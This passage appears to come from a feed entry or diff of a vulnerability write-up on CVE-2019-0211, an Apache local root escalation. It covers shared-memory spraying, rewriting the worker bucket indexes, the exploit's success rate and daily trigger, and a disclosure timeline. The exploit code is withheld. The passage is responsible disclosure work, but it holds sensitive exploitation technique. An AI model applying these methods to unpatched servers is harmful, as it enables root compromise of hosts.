+&lt;/ul&gt;
+&lt;p&gt;As &lt;code&gt;all_buckets&lt;/code&gt;' address changes, we can do two things to improve reliability: spray the SHM and use every &lt;code&gt;process_score&lt;/code&gt; structure - one for each PID.&lt;/p&gt;
+&lt;h3&gt;Spraying the shared memory&lt;/h3&gt;
+&lt;p&gt;If &lt;code&gt;all_buckets&lt;/code&gt;' new address is not far from the old one, &lt;code&gt;my_bucket&lt;/code&gt; will point close to our structure. Therefore, instead of having our &lt;code&gt;prefork_child_bucket&lt;/code&gt; structure at a precise point in the SHM, we can spray it all over unused parts of the SHM. The problem is that the
+structure is also used as a &lt;code&gt;zend_object&lt;/code&gt;, and therefore it has a size of (5 * 8 =) 40 bytes to include &lt;code&gt;zend_object.properties&lt;/code&gt;.
+Spraying a structure that big over a space this small won't help us much.
+To solve this problem, we superimpose the two center structures, &lt;code&gt;apr_proc_mutex_t&lt;/code&gt; and &lt;code&gt;zend_array&lt;/code&gt;, and spray their address in the rest of the shared memory.
+The impact will be that &lt;code&gt;prefork_child_bucket.mutex&lt;/code&gt; and &lt;code&gt;zend_object.properties&lt;/code&gt; point to the same address.
+Now, if &lt;code&gt;all_bucket&lt;/code&gt; is relocated not too far from its original address, &lt;code&gt;my_bucket&lt;/code&gt; will be in the sprayed area.&lt;/p&gt;
+&lt;p&gt;&lt;img alt="Call:exec" src="images/carpe-diem-cve-2019-0211-apache-local-root/3.png"&gt;&lt;/p&gt;
+&lt;h3&gt;Using every &lt;code&gt;process_score&lt;/code&gt;&lt;/h3&gt;
+&lt;p&gt;Each Apache worker has an associated &lt;code&gt;process_score&lt;/code&gt; structure, and with it a &lt;code&gt;bucket&lt;/code&gt; index.
+Instead of changing one &lt;code&gt;process_score.bucket&lt;/code&gt; value, we can change every one of them, so that they cover another part of memory. For instance:&lt;/p&gt;
+&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;ap_scoreboard_image-&amp;gt;parent[0]-&amp;gt;bucket = -10000 -&amp;gt; 0x7faabbcc00 &amp;lt;= all_buckets &amp;lt;= 0x7faabbdd00
+ap_scoreboard_image-&amp;gt;parent[1]-&amp;gt;bucket = -20000 -&amp;gt; 0x7faabbdd00 &amp;lt;= all_buckets &amp;lt;= 0x7faabbff00
+ap_scoreboard_image-&amp;gt;parent[2]-&amp;gt;bucket = -30000 -&amp;gt; 0x7faabbff00 &amp;lt;= all_buckets &amp;lt;= 0x7faabc0000
+&lt;/pre&gt;&lt;/div&gt;
+
+
+&lt;p&gt;This multiplies our success rate by the number of apache workers. Upon respawn, only one worker have a valid &lt;code&gt;bucket&lt;/code&gt; number, but this is not a problem because the others will crash, and immediately respawn.&lt;/p&gt;
+&lt;h3&gt;Success rate&lt;/h3&gt;
+&lt;p&gt;Different Apache servers have different number of workers. Having more workers mean we can spray the address of our mutex over less memory, but it also means we can specify more &lt;code&gt;index&lt;/code&gt; for &lt;code&gt;all_buckets&lt;/code&gt;. This means that having more workers improves our success rate. After a few tries on my test Apache server of 4 workers (default), I had &lt;strong&gt;~80% success rate&lt;/strong&gt;.&lt;/p&gt;
+&lt;p&gt;Again, if the exploit fails, it can be restarted the next day as Apache will still restart properly. Apache's &lt;code&gt;error.log&lt;/code&gt; will nevertheless contain notifications about its workers segfaulting.&lt;/p&gt;
+&lt;h2&gt;4. Await 6:25AM for the exploit to trigger&lt;/h2&gt;
+&lt;p&gt;Well, that's the easy step.&lt;/p&gt;
+&lt;h1&gt;Vulnerability timeline&lt;/h1&gt;
+&lt;ul&gt;
+&lt;li&gt;2019-02-22 Initial contact email to &lt;code&gt;security[at]apache[dot]org&lt;/code&gt;, with description and POC&lt;/li&gt;
+&lt;li&gt;2019-02-25 Acknowledgment of the vulnerability, working on a fix&lt;/li&gt;
+&lt;li&gt;2019-03-07 Apache's security team sends a patch for I to review, CVE assigned&lt;/li&gt;
+&lt;li&gt;2019-03-10 I approve the patch&lt;/li&gt;
+&lt;li&gt;2019-04-01 Apache HTTP version 2.4.39 released&lt;/li&gt;
+&lt;/ul&gt;
+&lt;p&gt;Apache's team has been prompt to respond and patch, and nice as hell. Really good experience. PHP never answered regarding the UAF.&lt;/p&gt;
+&lt;h1&gt;Questions&lt;/h1&gt;
+&lt;h4&gt;Why the name ?&lt;/h4&gt;
+&lt;p&gt;&lt;strong&gt;CARPE&lt;/strong&gt;: stands for CVE-2019-0211 Apache Root Privilege Escalation&lt;br /&gt;
+&lt;strong&gt;DIEM&lt;/strong&gt;: the exploit triggers once a day&lt;/p&gt;
+&lt;p&gt;I had to.&lt;/p&gt;
+&lt;h4&gt;Can the exploit be improved ?&lt;/h4&gt;
+&lt;p&gt;Yes. For instance, my computations for the bucket indexes are shaky.
+This is between a POC and a proper exploit. BTW, I added tons of comments, it is meant to be educational as well.&lt;/p&gt;
+&lt;h4&gt;Does this vulnerability target PHP ?&lt;/h4&gt;
+&lt;p&gt;No. It targets the Apache HTTP server.&lt;/p&gt;
+&lt;h1&gt;Exploit&lt;/h1&gt;
+&lt;p&gt;The exploit will be disclosed at a later date.&lt;/p&gt;</content><category term="apache"></category><category term="http"></category><category term="lpe"></category><category term="local root"></category><category term="exploit"></category><category term="CVE-2019-0211"></category></entry></feed>
